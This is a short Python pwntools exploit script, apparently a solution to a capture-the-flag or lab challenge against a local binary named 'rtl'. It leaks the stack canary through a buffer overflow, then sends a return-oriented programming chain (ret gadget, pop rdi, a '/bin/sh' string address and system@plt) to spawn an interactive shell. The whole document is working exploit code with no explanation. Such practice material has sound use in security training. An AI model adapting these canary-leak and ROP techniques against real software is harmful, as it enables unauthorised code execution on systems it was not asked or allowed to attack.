from pwn import *

p = process("./rtl")
# Canary Leak
pay = b''
pay += b'a'*57
p.sendafter("Buf: ", pay)

p.recvuntil(pay)

canary = b''
canary += b"\x00"
canary += p.recv(7)
# Payload

ret= 0x000000000040101a
poprdi = 0x0000000000401333 
binsh =  0x402004
systemplt = 0x4010b0

load = b''
load += b'a' * 56
load += (canary)
load += b'r' * 8
load += p64(ret)
load += p64(poprdi)
load += p64(binsh)
load += p64(systemplt)


p.sendafter("Buf: ", load)

p.interactive()